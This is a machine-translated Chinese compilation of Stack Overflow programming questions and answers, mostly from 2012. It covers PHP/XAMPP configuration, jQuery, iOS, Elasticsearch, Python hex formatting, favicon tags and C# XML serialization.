要解决此问题，请转到“c:\xampp\php\php.ini”在编辑器中打开它并搜索动态扩展，然后向下搜索 ;extension=php_intl.dll 并启用它（删除；变成像）extension= php_intl.dll 之后保存您的文件 php.ini 并重新启动您的本地主机

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-06-15T13:39:07.483

要在 Xampp 中激活此扩展，只需编辑您的 php.ini（即在 C:\xampp\php 目录中）并删除分号以取消注释此行：

```
;extension=php_intl.dll 
```

最后别忘了重启 Apache ！**

# jquery - 使用closest() 向上导航表DOM

> ID：10218138
> 
> 赞同：0
> 
> 时间：2012-04-18T21:16:08.650
> 
> 标签：jquery, mysql

我目前正在使用*最接近 ()*向上导航 dom 并使用它来查找行元素*tr*但它似乎返回一个空警报对话框，指示没有检索任何内容。我究竟做错了什么？

**JavaScript**

```
$(document).ready(function () {
$('.manage').click(function(){
  // find the row we are in
  var $self = $( self );
  var $row = $self.closest( 'tr' );

  // read the id
  var $idCell = $row.find( '.id' );
  var caseId = $idCell.text();

  alert(caseId);

  });
}); 
```

**HTML：**

```
 <table border="0" class="sortable">
      <tr>
        <th>ID</th>
        <th>Functions</th>
      </tr>
      <?php do { ?>
        <tr>
          <td class="id"><?php echo $row_cases['id'].'-'.$_GET["progress"]; ?></td>
          <td><img src="components/manage.png" width="16" height="16" class="manage">
        </tr>
        <?php } while ($row_cases = mysql_fetch_assoc($cases)); ?>
    </table> 
```

提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T21:18:31.620

您正在使用`self`而不是`this`，JavaScript 中没有`self`。这应该有效：

```
$(document).ready(function () {
     $('.manage').click(function(){
          // find the row we are in
          var $row = $( this ).closest( 'tr' );

          // read the id
          var $idCell = $row.find( '.id' );
          var caseId = $idCell.text();

          alert(caseId);
     });
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T21:17:38.997

你想要`this`，而不是`self`：

```
var $self = $(this); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-18T21:17:45.653

最`var $self = $( self );`有可能的是，应该是 var`$self = $( this );`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-18T21:42:08.713

以下行中的“自我”是什么？

```
var $self = $( self ); 
```

应该是这样吗？

```
v$('.manage').click(function(event) {
    // find the row we are in
    var $self = $( event.target ); 
```

# iphone - iPhone上的SIGABRT但不是模拟器

> ID：10218147
> 
> 赞同：0
> 
> 时间：2012-04-18T21:16:50.103
> 
> 标签：iphone, sigabrt

当我尝试在我的 iPhone 上运行它时，我的 iPhone 应用程序突然发出 SIGABRT 错误消息，甚至在到达应用程序委托的第一行之前。它在模拟器中运行良好，当我尝试在设备上加载应用程序时，即使恢复以前工作的快照也会出现同样的错误。

在问题发生之前，我摆弄了产品名称构建设置和数据模型，但如前所述，现在运行良好的旧快照将无法加载，这表明问题不在代码中。

我已尝试重新启动 xCode、计算机、iPhone 并删除应用程序，但问题仍然存在。

我确定问题出在设备上

有什么想法可能是什么问题或我该如何解决？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T05:26:04.147

接受 Till 的建议，我重新安装了 iOS（好吧，实际上我将它更新到了 5.1），一切都恢复正常了。感谢您的建议。我不知道出了什么问题，但至少它现在又可以工作了！

# web-services - 访问 Web 服务的客户端应用程序的许可方案

> ID：10218149
> 
> 赞同：1
> 
> 时间：2012-04-18T21:16:51.743
> 
> 标签：web-services, licensing

我目前正在决定我应该根据什么许可证发布访问我们的 Web 服务的 .NET 客户端软件。描述我的情况的最佳方式就像 Dropbox，因为他们有一个客户端软件，只允许用户访问他们的网络服务。

我不确定最好的决定是在这方面开源以促进增长、支持等，还是保持源代码关闭以帮助减少专门用于滥用/滥用 Web 服务的非官方客户端的数量后端。

（如果它有助于任何客户端软件将计算并将数据发送到后端，因此最好将篡改提交的数据保持在最低限度。）

欢迎优点，缺点和建议

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-18T21:24:42.300

没有办法在 Web 服务中处理会话吗？如果您可以实现这一点，您可以让客户端的用户首先登录到您的 Web 服务（通过客户端应用程序），然后仅在成功登录后才使这些功能可用。这样，如果您决定发布开源版本，您将大大降低恶意客户端的风险。

至于是否开源，这完全取决于你，但我认为选择不会影响安全性。

# codeigniter - Ci没有将每个mysql行输出到选择框中

> ID：10218151
> 
> 赞同：0
> 
> 时间：2012-04-18T21:16:58.137
> 
> 标签：codeigniter

在 Codeigniter 中，我如何将所有数据库值输出到选择框中？当我执行以下操作时，我只会输出第一行。它似乎在第一次之后被切断了。有什么帮助吗？

```
<body> 
<form method="post" action="<?=base_url()?>index.php/admin/addImg">
img url <input name="imgURL" type="text" /><br />
<br />  select project <select name="selectedProject">
<?php $query = $this->db->query("SELECT * FROM projects");
foreach ($query->result() as $row) { ?>
<option><?php echo $row->projectName.$row->projectId ?></option>
</select></form>
<?php } ?>
</body> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T21:23:27.850

你正在关闭你`select`的第一个循环。尝试这样的事情：

```
<select name="selectedProject">
    <?php foreach($query->result() as $row) {
        <option><?php echo $row->projectName.$row->projectId ?></option>
    <?php } ?>
</select> 
```

此外，CodeIgniter为这类事情[提供了一个方便的表单助手。](http://codeigniter.com/user_guide/helpers/form_helper.html)

# objective-c - 如果调用对象被释放，调度线程会发生什么？

> ID：10218155
> 
> 赞同：0
> 
> 时间：2012-04-18T21:17:04.243
> 
> 标签：objective-c, uitableview, grand-central-dispatch

我正在将图像异步加载到 UITableView 中的单元格上。代码如下：

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{

// after getting the cell..

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        NSString *imageUrl = [someMethodToGetImageUrl];
        NSData *imageData = [[NSData alloc] initWithContentsOfURL:[NSURL imageUrl]];
        dispatch_async(dispatch_get_main_queue(), ^{
            cell.imageView.image = [UIImage imageWithData:imageData];
            [tableView reloadRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:UITableViewRowAnimationNone];
        });
    });

} 
```

我的问题是，如果这个 tableView 在触发调度之后被释放（例如从 navigationController 堆栈中弹出），但在线程完成尝试设置单元格的图像之前，会发生什么。该单元也将被释放，并且尝试对该单元执行操作会导致崩溃，不是吗？

我一直在使用上面的代码崩溃。如果我进入这个 tableView 然后立即退出，我会在线崩溃：

```
[tableView reloadRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:UITableViewRowAnimationNone]; 
```

如果我将其更改为：

```
[self.tableView reloadRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:UITableViewRowAnimationNone]; 
```

崩溃消失了，这对我来说真的没有意义。有人可以向我解释为什么会这样吗？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T23:07:56.273

任何可能使块超出其原始范围的例程都需要复制它。 `dispatch_async()`做。

当一个块被复制时，它会保留它引用的任何对象指针变量。如果块以实例变量的形式隐式访问`self`，它会保留`self`. 它持有这些引用，直到它自己被释放。

在您的示例中，`cell`、`imageData`、`indexPath`和`tableView`都保留到块完成。

# playframework - Elasticsearch 抛出异常：NoNodeAvailableException 发生：没有可用节点

> ID：10218156
> 
> 赞同：4
> 
> 时间：2012-04-18T21:17:13.233
> 
> 标签：playframework, elasticsearch

我决定在一个简单的待办事项列表应用程序上尝试第一次使用 elasticsearch。我按照[这个视频](http://geeks.aretotally.in/play-elastic-search-module-new-0-0-5-release-with-screencast)使用该模块并在模块本身中没有修改任何内容我所做的只是创建应用程序并在控制器中添加类 search.java。

```
Execution exception
NoNodeAvailableException occured : No node available

In {module:elasticsearch-0.4}/app/controllers/elasticsearch/ElasticSearchController.java (around line 367)

363:
            // FIXME Currently we ignore the orderBy and order fields
364:
            query.from((page - 1) * getPageSize()).size(getPageSize());
365:
            query.hydrate(true);
366:

367:
            return query.fetch();
368:
        } 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-28T08:06:27.087

我有同样的问题，我所做的是：

1.检查节点是否打开了正确的端口：

```
telnet [ip address] 9300
Trying [ip address]
Connected to mynode1 ([ip address]).
Escape character is '^]'.
telnet> quit
Connection closed. 
```

2.使用 telnet 检查一切是否正常 =)：

```
$ telnet [ip address] 9400
Trying [ip address]...
telnet: Unable to connect to remote host: Connection refused 
```

3.确保您拥有正确版本的elasticsearch！

在我使用的 elasticsearch[插件中，使用了 elastisearch 0.19.10。](https://github.com/nboire/play2-elasticsearch)当我在我的服务器上安装 elasticsearch 时，我不小心使用了 0.20.1 导致： **NoNodeAvailableException 发生：没有节点可用**异常。

希望这可以帮助！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-25T11:22:56.430

1.  您是否已在您的 中配置了您的弹性搜索节点`application.conf`？进一步来说 `elasticsearch.client=mynode1:9200,mynode2:9200`

2.  [您还可以使用elasticsearch-head 插件](http://www.elasticsearch.org/guide/reference/modules/plugins.html)检查您的弹性搜索节点是否运行良好。

# grails - Grails - Servlet 3.0 异步请求处理

> ID：10218163
> 
> 赞同：2
> 
> 时间：2012-04-18T21:17:47.467
> 
> 标签：grails, asynchronous, controller, httprequest, servlet-3.0

我今天发现了 Servlet 3.0 异步工具。我已经阅读了它，并认为我理解了这个概念。

我想知道：这会对“标准”控制器的操作产生任何影响，还是应该将其保存以供 Web 服务或广泛的计算过程使用？

换句话说，将它用于所有控制器的动作，而不事先考虑动作方法的计算时间是不是一个坏主意？如果是，你能给我解释一下为什么吗？

先感谢您。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T19:32:09.723

不，这将是一个坏主意。

在控制器操作中，您收到一个请求，并且您希望尽快提供响应。您只能将异步用于可以延迟的事情。

如果用户在您的网站上请求页面，您不能以空页面响应，然后执行推送以更新他的页面。我只会将此功能用于 AJAX 请求，甚至不会用于所有请求。你必须决定什么是异步运行有意义，什么不是。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-04-09T13:18:45.343

您应该阅读 Grails 文档以了解[异步请求处理](http://grails.github.io/grails-doc/latest/guide/async.html#asyncRequests)

> 一般来说，对于快速执行的控制器操作，异步处理请求几乎没有什么好处。但是，对于长时间运行的控制器操作，这是非常有益的。
> 
> 原因是异步/非阻塞响应，一个线程==一个请求==一个响应关系被打破。容器可以保持客户端响应打开和激活，同时将线程返回容器处理另一个请求，提高可伸缩性。

希望这应该足够清楚，但请询问是否有不清楚的地方。

# python - python - 如何在Python中没有额外的'0x'前导和'L'尾随字符的情况下将整数转换为十六进制？

> ID：10218164
> 
> 赞同：22
> 
> 时间：2012-04-18T21:18:07.317
> 
> 标签：python, hex

我正在尝试将大整数转换为十六进制，但结果我在开头得到了额外的“0x”，在and处得到了“L”。有什么办法可以去掉它们。谢谢。号码是：

```
44199528911754184119951207843369973680110397865530452125410391627149413347233422
34022212251821456884124472887618492329254364432818044014624401131830518339656484
40715571509533543461663355144401169142245599341189968078513301836094272490476436
03241723155291875985122856369808620004482511813588136695132933174030714932470268
09981252011612514384959816764532268676171324293234703159707742021429539550603471
00313840833815860718888322205486842202237569406420900108504810 
```

在十六进制我得到：

```
0x2ef1c78d2b66b31edec83f695809d2f86e5d135fb08f91b865675684e27e16c2faba5fcea548f3
b1f3a4139942584d90f8b2a64f48e698c1321eee4b431d81ae049e11a5aa85ff85adc2c891db9126
1f7f2c1a4d12403688002266798ddd053c2e2670ef2e3a506e41acd8cd346a79c091183febdda3ca
a852ce9ee2e126ca8ac66d3b196567ebd58d615955ed7c17fec5cca53ce1b1d84a323dc03e4fea63
461089e91b29e3834a60020437db8a76ea85ec75b4c07b3829597cfed185a70eeaL 
```

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2012-04-18T21:22:21.000

是十六进制数字的`0x`文字表示。最后`L`意味着它是一个*长*整数。

如果您只想将数字的十六进制表示为不带`0x`and的字符串`L`，则可以使用带 . 的字符串格式`%x`。

```
>>> a = 44199528911754184119951207843369973680110397
>>> hex(a)
'0x1fb62bdc9e54b041e61857943271b44aafb3dL'
>>> b = '%x' % a
>>> b
'1fb62bdc9e54b041e61857943271b44aafb3d' 
```

* * *

## 回答 #2

> 赞同：40
> 
> 时间：2012-04-18T21:21:54.917

当然，继续删除它们。

```
hex(bignum).rstrip("L").lstrip("0x") or "0" 
```

（走这`strip()`条路，所以如果那些额外的字符碰巧不在那里，它仍然可以工作。）

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2015-07-28T08:16:21.500

与 Praveen 的回答类似，您也可以直接使用内置的`format()`.

```
>>> a = 44199528911754184119951207843369973680110397
>>> format(a, 'x')
'1fb62bdc9e54b041e61857943271b44aafb3d' 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2019-01-02T12:41:44.330

我认为使用条带是危险的想法。
因为`lstrip`还是`rstrip`条`0`。

前任）

```
a = '0x0'
a.lstrip('0x')  

'' 
```

结果是`''`，不是`'0'`。

在您的情况下，您可以简单地使用`replace`来防止上述情况。
这是示例代码。

```
hex(bignum).replace("L","").replace("0x","") 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-08-31T10:04:19.237

使用接受的答案时要小心，因为它`lstrip('0x')`还会删除任何前导零，这可能不是您想要的，见下文：

```
>>> account = '0x000067'
>>> account.lstrip('0x')
'67'
>>> 
```

如果您确定`'0x'`前缀将始终存在，则可以简单地删除它，如下所示：

```
>>> hex(42)
'0x2a'
>>> hex(42)[2:]
'2a'
>>> 
```

`[2:]`将获取字符串中除前两个字符之外的每个字符。

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2017-11-09T11:00:52.400

一种更优雅的方式是

```
hex(_number)[2:-1] 
```

但是如果您使用 gmpy mpz 类型，则必须小心，那么最后不存在“L”，您可以使用

```
hex(mpz(_number))[2:] 
```

# macos - NPAPI 插件在 Mac 上的 Firefox5.0 中不起作用

> ID：10218165
> 
> 赞同：0
> 
> 时间：2012-04-18T21:18:08.237
> 
> 标签：macos, npapi, firebreath, browser-plugin

我有一个 NPAPI 插件（使用 firebreath 构建），它可以在 Safari 和 Google Chrome（都在 Mac 上）运行良好；但它无法在 Firefox 上运行。当我查看 Firefox 插件 (about:plugin) 时，它正确显示了我的插件名称和版本，并将其显示为已启用。

以下是我用来在 javascript 中加载插件的代码 -

```
<object name="fp" type="application/x-myplugin" width="0" height="0">
    <embed name="jsPlugin" id="jsPlugin" width="0" height="0" type="application/x-myplugin">
    </embed>
</object> 
```

我使用这个插件如下 -

```
function PluginVwersion(){
    var jsPlugin = document.getElementById('jsPlugin');
    jsPlugin.GetScannerDetails();
} 
```

但是每当我在 Firefox 中测试此代码时，它都不起作用，并且我在错误控制台中看到以下错误 - 错误：jsPlugin.GetScannerDetails 不是函数源文件：file:///Users/u162794/Desktop/test。 html

任何帮助表示赞赏。

问候， Yogesh Joshi

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T01:35:24.297

您究竟为什么要在对象标签中使用嵌入标签？去掉embed标签，把你的object标签id设置为jsPlugin，然后试试。

```
<object id="jsPlugin" type="application/x-myplugin" width="0" height="0"></object> 
```

还可以尝试使用在项目的 build/projects//gen 文件夹中创建的示例 FBControl.htm 文件，就像 FireBreath 网站上建议的那样。

# matlab - 在 MATLAB 中实现导数滤波器

> ID：10218168
> 
> 赞同：1
> 
> 时间：2012-04-18T21:18:30.880
> 
> 标签：matlab, image-processing

我的任务是实现一个 3x3 x 微分图像滤波器，该滤波器利用[中心差异](http://en.wikipedia.org/wiki/Finite_difference#Forward.2C_backward.2C_and_central_differences)并同时在 y 方向上执行高斯平滑。

我在 x 方向 (h=1) 上有一个用于该任务的公式，但我不确定我是否理解正确：

```
(f(x+h;y)-f(x-h;y)) / 2*h 
```

相对于我的当前像素 (x)，我在当前像素之前取像素值 +1，然后从当前像素后面位置 -1 的像素中减去该值。这个值是否除以 2 然后或多或少是我在 x 方向上的一阶推导？我的实际当前像素值根本没有使用吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T01:34:57.870

传统上，对于图像，中心不用于导数过滤器。推理如下。

1.  大多数图像处理过滤器的目的是在原始图像中找到东西，并识别它们。因此，一个好的内核 (*) 将位于与更改相同的位置。
2.  导数应该是零的意思。如果将内核中的所有像素相加，它们的总和应该为零。

鉴于这两点，尤其是第一点，很明显内核应该有奇数个元素，并且中心应该是 0。本质上，如果内核是奇数，那么它将倾向于保留原始边缘。

以一维示例为例，并应用您提供的公式，修剪边缘（将它们强制为 0），结果如下：

```
[0  1  3  2  10  12 8 11];
[0 -2 -1 -7 -10   2 1 0 ]; 
```

请注意，两个最高幅度值正好位于峰值处。尝试使用其他内核，包括一些中心值不为 0 的内核，看看结果如何。

(*) 内核代表您正在执行的功能。在您提供的情况下，内核是 [1 0 -1]

# php - 将 $_SESSION 放入 mySQL 查询

> ID：10218170
> 
> 赞同：0
> 
> 时间：2012-04-18T21:18:31.807
> 
> 标签：php, sql, session

如果我手动**将 $add**声明为一个值（例如 30），当我尝试将其设置为 user_id 会话时，我有一个运行良好的查询，但查询失败。

```
// $add = 30;
// The line above works
$add = mysql_real_escape_string($_SESSION['user_id']);
$query = "UPDATE mytable SET act=0, add=$add WHERE id=$selected_user"; 
```

我出错的任何想法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T21:21:53.573

When using sessions you always need to specify this before any `$_SESSION` usage like this:

```
session_start();
//now you are able to use this
$_SESSION['user_id'] = 30; 
```

By the other hand, I got the same problem as you before and what you need to do is to put the `$_SESSION['user_id']` in a variable, then you will be able to pass it to the `mysql_real_escape_string` without problems.

```
$id = $_SESSION['user_id'];
//now use this:
$add = mysql_real_escape_string($id); 
```

Hope this helps.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T21:24:19.403

> 问：有什么想法我哪里出错了吗？

答：是的。会话为空。

建议：

1.  做一个“回声”来验证 $_SESSION['user_id'] 是空的（我 99% 肯定它会是）

2.  确保您实际上是在设置会话（例如“session_start()”）

3.  确保您的“session_start()”出现*在*您的`<html>`标签之前。

4.  调试设置 $_SESSION['user_id'] 的代码

这是一个很好的链接：

[http://www.w3schools.com/php/php_sessions.asp](http://www.w3schools.com/php/php_sessions.asp)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-18T21:26:20.543

我几乎可以保证您已经忘记`session_start();`了脚本的顶部。如果不尝试回显会话变量，如果没有返回任何内容，则说明您没有对其进行任何设置。

# ios - 确定 iOS 中的 WWAN 连接类型

> ID：10218176
> 
> 赞同：1
> 
> 时间：2012-04-18T21:18:55.367
> 
> 标签：ios, xcode, reachability

有没有办法确定 iOS 中的 WWAN 连接类型（3G/Edge 等）？我熟悉 Apple 的 Reachability 类，但它可能只是 Wifi/WWAN 之间的不同......

非常感谢您的帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-08-22T11:42:32.343

在 iOS 7.0+ 中，我们有`CoreTelephony`可以为我们提供有关网络类型所需详细信息的框架。

这是一个示例。

```
CTTelephonyNetworkInfo *telephonyInfo = [[CTTelephonyNetworkInfo alloc] init];
        NSString *currentRadio = telephonyInfo.currentRadioAccessTechnology;
        if ([currentRadio isEqualToString:CTRadioAccessTechnologyLTE]) {
            // LTE

        } else if([currentRadio isEqualToString:CTRadioAccessTechnologyEdge]) {
            // EDGE

        } else if([currentRadio isEqualToString:CTRadioAccessTechnologyWCDMA]){
            // 3G

        } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-03T10:31:17.343

此处的答案[Checkingcellular network type in iOS](https://stackoverflow.com/a/9561281/1494958)可能会对您有所帮助。它说您可以尝试从他们的 IP 地址范围确定您的移动网络类型。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-04-20T16:54:23.727

斯威夫特 5，iOS12+：

```
class func gmGetNetWorkName() -> String {
        guard let reachability = SCNetworkReachabilityCreateWithName(kCFAllocatorDefault, "www.google.com") else {
            return "NO INTERNET"
        }

        var flags = SCNetworkReachabilityFlags()
        SCNetworkReachabilityGetFlags(reachability, &flags)

        let isReachable = flags.contains(.reachable)
        let isWWAN = flags.contains(.isWWAN)

        if isReachable {
            if isWWAN {
                let networkInfo = CTTelephonyNetworkInfo()
                let carrierType = networkInfo.serviceCurrentRadioAccessTechnology

                guard let carrierTypeName = carrierType?.first?.value else {
                    return "UNKNOWN"
                }

                switch carrierTypeName {
                case CTRadioAccessTechnologyGPRS, CTRadioAccessTechnologyEdge, CTRadioAccessTechnologyCDMA1x:
                    return "2G"
                case CTRadioAccessTechnologyLTE:
                    return "4G"
                default:
                    return "3G"
                }
            } else {
                return "WIFI"
            }
        } else {
            return "NO INTERNET"
        }
    } 
```

# html - 需要为 favicon.ico 添加链接标签吗？

> ID：10218178
> 
> 赞同：167
> 
> 时间：2012-04-18T21:18:59.933
> 
> 标签：html, favicon

是否有任何现代浏览器不会自动检测 favicon.ico？是否有任何理由为 favicon.ico 添加链接标签？

```
<link rel="shortcut icon" href="/favicon.ico"> 
```

我的猜测是，如果您决定使用 GIF 或 PNG，则只需将其包含在 HTML 文档中......

* * *

## 回答 #1

> 赞同：271
> 
> 时间：2012-04-18T21:22:45.947

**为favicon选择*不同的位置或文件类型（例如[PNG](http://caniuse.com/#feat=link-icon-png)或[SVG](http://caniuse.com/#feat=link-icon-svg)）***
： 一个原因可能是您希望将图标放在特定位置，可能在图像文件夹或类似文件夹中。例如：

```
<link rel="icon" href="_/img/favicon.png"> 
```

这个不同的位置甚至可能是一个 CDN，就像 SO 似乎与`<link rel="shortcut icon" href="http://cdn.sstatic.net/stackoverflow/img/favicon.ico">`.

要了解有关使用其他文件类型（如 PNG）的更多信息，请查看[此问题](https://stackoverflow.com/q/1344122/419956)。

**出于*缓存清除*目的：**
将查询字符串添加到路径以进行缓存清除目的：

```
<link rel="icon" href="/favicon.ico?v=1.1"> 
```

网站图标被大量缓存，这是确保刷新的好方法。

* * *

**关于默认位置的脚注：**
就问题的第一部分而言：所有现代浏览器都会在默认位置检测到一个网站图标，所以这*不是*使用 a 的理由`link`。

* * *

**关于脚注`rel="icon"`：**
正如[@Semanino 的回答](https://stackoverflow.com/a/31132296/419956)所示，使用`rel="shortcut icon"`是旧版本 Internet Explorer 所需的旧技术，但在大多数情况下可以用更正确的`rel="icon"`指令代替。[文章@Semanino 基于此](https://mathiasbynens.be/notes/rel-shortcut-icon)正确链接到显示值[的适当规范](https://html.spec.whatwg.org/multipage/semantics.html#linkTypes)不是有效选项。`rel``shortcut`

* * *

## 回答 #2

> 赞同：55
> 
> 时间：2015-06-30T07:36:49.743

**请注意**，W3C 和 WhatWG 的 HTML5 规范都**标准化了**

```
<link rel="icon" href="/favicon.ico"> 
```

注意“rel”属性的值！

`shortcut icon`该属性的值`rel`是一个非常古老的 Internet Explorer 特定扩展并且***已弃用***。

所以请考虑不再使用它并更新您的文件，以便它们符合标准并在所有浏览器中正确显示。

您可能还想看看这篇很棒的帖子：[rel="shortcut icon" 被认为是有害的](https://mathiasbynens.be/notes/rel-shortcut-icon)

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2016-11-24T17:13:50.887

> ```
> <link rel="icon" type="image/x-icon" href="http://example.com/favicon.ico" />
> <link rel="icon" type="image/png" href="http://example.com/favicon.png" />
> <link rel="icon" type="image/gif" href="http://example.com/favicon.gif" />
> <link rel="icon" type="image/jpeg" href="http://example.com/favicon.jpeg" />
> <link rel="icon" type="image/webp" href="http://example.com/favicon.webp" /> 
> ```

**这完全取决于您喜欢使用哪种格式的图像！**
***如果你有你网站的图标，那对用户体验来说会更好！***

## 演示

> 在浏览器选项卡中显示徽标

[![在此处输入图像描述](../Images/f42b97d6172561347207789a33a95e6a.png)](https://i.stack.imgur.com/wdE8C.png)

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2020-10-22T08:45:48.763

**2020 年 10 月更新：**

因此，如果您在此页面上摸不着头脑，为什么我的网站图标不起作用，请继续阅读。我尝试了所有的东西（我应该认为我做对了），但 favicon 没有出现在浏览器选项卡上。

这是一个完美**运行的简单破解代码：**

`<link rel="icon" href="https://abcde.neocities.org/bla123.jpg" size="16x16" type="image/jpg">`

[![在此处输入图像描述](../Images/32099e5f2aafe304dc7bafdadc7f30b8.png)](https://i.stack.imgur.com/hWTEJ.png)

笔记：

1.  将图像放在**ROOT**文件夹中（在我的一次不成功的尝试中，我没有使用根目录）
2.  使用直接的 favicon **url 链接**（而不是 href="images/bla123.jpg"）。
3.  我把这个标签放在< **Header** >中**的 < **title** > 标签下面**
***   我将图标大小设置为**64x64 像素**，大小为 2.16 KB**

 **我在 Firefox、Chrome、Edge 和 opera 上对其进行了测试。操作系统：Win 10、Mac OSX、ios 和 Android。我也没有遇到任何兑现问题，我一刷新页面就可以正常工作。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2018-05-14T13:10:39.513

我们可以为平台特定尺寸的所有设备添加

```
<link rel="apple-touch-icon" sizes="57x57" href="fav_icons/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="fav_icons/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="fav_icons/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="fav_icons/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="fav_icons/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="fav_icons/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="fav_icons/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="fav_icons/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="fav_icons/apple-icon-180x180.png">

<link rel="icon" type="image/png" sizes="192x192"  href="fav_icons/android-icon-192x192.pn">
<link rel="icon" type="image/png" sizes="32x32" href="fav_icons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="fav_icons/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="fav_icons/favicon-16x16.png"> 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-04-18T21:35:43.663

最重要的是，并非所有浏览器*都会*真正查找您的*favicon.ico*文件。一些浏览器允许用户选择是否应该自动查看。因此，为了确保它*始终*出现并被查看，您必须对其进行定义。**

# c# - XmlSerializer.Serialize 剥离 标签

> ID：10218181
> 
> 赞同：18
> 
> 时间：2012-04-18T21:19:25.820
> 
> 标签：c#

我正在尝试与支付处理器进行通信。当我`XmlSerializer.Serialize` 在我的对象上使用时，我得到

```
<?xml version=\"1.0\" encoding=\"utf-16\"?>
<txn xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">
  <ssl_merchant_id>xxxxxx</ssl_merchant_id>
  <ssl_user_id>xxxxxx</ssl_user_id>
  <ssl_pin>xxxxxx</ssl_pin>
  <ssl_test_mode>True</ssl_test_mode>
  <ssl_transaction_type>ccavsonly</ssl_transaction_type>
  <ssl_card_number>4111111111111111</ssl_card_number>
  <ssl_exp_date>0612</ssl_exp_date>
  <ssl_avs_address>101 Main St.</ssl_avs_address>
  <ssl_avs_zip>90210</ssl_avs_zip>
</txn> 
```

在使用该方法之前，我手动构建了用于测试的 XML，这很有效：

```
<txn>
  <ssl_merchant_id>xxxxxx</ssl_merchant_id>
  <ssl_user_id>xxxxxx</ssl_user_id>
  <ssl_pin>xxxxxx</ssl_pin>
  <ssl_test_mode>True</ssl_test_mode>
  <ssl_transaction_type>ccavsonly</ssl_transaction_type>
  <ssl_card_number>4111111111111111</ssl_card_number>
  <ssl_exp_date>0612</ssl_exp_date>
  <ssl_avs_address>101 Main St.</ssl_avs_address>
  <ssl_avs_zip>90210</ssl_avs_zip>
</txn> 
```

我将如何从 XML 中删除`<?xml version=\"1.0\" encoding=\"utf-16\"?>`and或者不让序列化程序生成它？`xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">`

我的对象看起来像：

```
[XmlRoot(ElementName="txn")]
public class AvsTransmission
{
    [XmlElement]
    public string ssl_merchant_id { get; set; }
    [XmlElement]
    public string ssl_user_id { get; set; }
    [XmlElement]
    public string ssl_pin { get; set; }
    [XmlElement]
    public string ssl_test_mode { get; set; }
    [XmlElement]
    public string ssl_transaction_type { get; set; }
    [XmlElement]
    public string ssl_card_number { get; set; }
    [XmlElement]
    public string ssl_exp_date { get; set; }
    [XmlElement]
    public string ssl_avs_address { get; set; }
    [XmlElement]
    public string ssl_avs_zip { get; set; }
} 
```

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2012-04-18T21:23:33.237

我的第一个答案只是问题的一半，您还必须删除前面提到的声明。

这是一个例子：

```
XmlWriterSettings settings = new XmlWriterSettings();
settings.OmitXmlDeclaration = true;

MemoryStream ms = new MemoryStream();
XmlWriter writer = XmlWriter.Create(ms, settings);

XmlSerializerNamespaces names = new XmlSerializerNamespaces();
names.Add("", "");

XmlSerializer cs = new XmlSerializer(typeof(Cat));

cs.Serialize(writer, new Cat { Lives = 9 }, names);

ms.Flush();
ms.Seek(0, SeekOrigin.Begin);
StreamReader sr = new StreamReader(ms);
var xml = sr.ReadToEnd(); 
```

该字符串`xml`现在包含：

```
<cat><Lives>9</Lives></cat> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-12-02T14:57:26.553

第一个函数将对象转换为 xml 字符串，第二个函数同时转换对象并将 xml 写入文件。

```
 public static string Serialize<T>(T obj)
    {
        XmlWriterSettings settings = new XmlWriterSettings();
        settings.OmitXmlDeclaration = true;
        var writer = new StringWriter();
